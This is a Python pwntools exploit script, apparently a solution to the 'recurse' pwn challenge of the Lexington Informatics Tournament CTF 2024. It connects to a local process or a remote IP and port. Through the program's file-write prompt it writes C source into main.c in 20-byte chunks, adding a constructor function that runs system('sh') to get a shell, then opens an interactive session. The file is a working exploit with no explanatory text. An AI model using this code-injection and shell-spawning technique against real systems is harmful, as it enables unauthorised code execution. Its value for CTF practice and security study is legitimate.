#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/Lexington Informatics Tournament CTF 2024/pwn/recurse/main')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r, payload=b''):
    attach(r)

    r.sendlineafter(b'Filename? ', b'main.c')
    r.sendlineafter(b'(W)? ', b'W')
    r.sendlineafter(b'Contents? ', payload)

    if b'}' in payload:
        r.interactive()
    else:
        print(r.recv())
        r.close()
    return

if __name__ == '__main__':
    code = b'__attribute__((constructor)) void A() { system("sh"); }'

    for i in range(0, len(code), 20):
        if len(sys.argv) == 2 and sys.argv[1] == 'remote':
            REMOTE = True
            r = remote('34.31.154.223', 53840)
        else:
            REMOTE = False
            r = process([TARGET,])

        exploit(r, code[i:i+20])

    exit(0)
